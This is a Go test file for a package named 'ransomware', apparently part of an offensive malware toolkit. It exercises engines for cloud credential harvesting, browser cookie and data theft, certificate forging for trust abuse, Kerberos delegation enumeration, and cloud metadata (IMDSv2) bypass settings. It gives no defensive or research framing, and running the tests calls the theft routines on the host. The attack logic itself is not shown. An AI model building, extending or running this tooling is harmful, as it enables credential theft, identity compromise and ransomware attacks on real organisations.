package ransomware

import (
	"testing"
)

func TestNewCloudExploitEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	c := NewCloudExploitEngine(cfg)
	if c == nil {
		t.Fatal("NewCloudExploitEngine() returned nil")
	}
}

func TestNewTrustExploitEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	tEngine := NewTrustExploitEngine(cfg)
	if tEngine == nil {
		t.Fatal("NewTrustExploitEngine() returned nil")
	}
}

func TestNewIdentityDestructionEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	id := NewIdentityDestructionEngine(cfg)
	if id == nil {
		t.Fatal("NewIdentityDestructionEngine() returned nil")
	}
}

func TestNewKerberosDelegationEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	k := NewKerberosDelegationEngine(cfg)
	if k == nil {
		t.Fatal("NewKerberosDelegationEngine() returned nil")
	}
}

func TestCloudExploitEngineInit(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	c := NewCloudExploitEngine(cfg)

	creds := c.HarvestCredentials()
	if len(creds) == 0 {
		t.Log("HarvestCredentials returned 0 (expected in non-cloud env)")
	}
}

func TestIdentityDestructionStealCookies(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	id := NewIdentityDestructionEngine(cfg)

	data := id.StealBrowserData()
	if len(data) == 0 {
		t.Log("StealBrowserData returned 0 (expected in test env)")
	}
}

func TestTrustExploitEngineCerts(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	tEngine := NewTrustExploitEngine(cfg)

	cert := tEngine.GenerateCert()
	if cert == nil {
		t.Log("GenerateCert returned nil (expected if no crypto lib)")
	} else {
		t.Logf("Generated cert: %v", cert)
	}
}

func TestIMDSv2BypassConfig(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	if cfg.AWSProfile != "default" {
		t.Errorf("expected AWSProfile=default, got %s", cfg.AWSProfile)
	}
	t.Logf("Cloud config: AWS=%s, Azure=%s, GCP=%s", cfg.AWSProfile, cfg.AzureProfile, cfg.GCPProject)
}

func TestKerberosDelegationInit(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	k := NewKerberosDelegationEngine(cfg)

	result := k.EnumerateDelegations()
	if len(result) == 0 {
		t.Log("EnumerateDelegations returned 0 (expected in non-AD env)")
	}
}
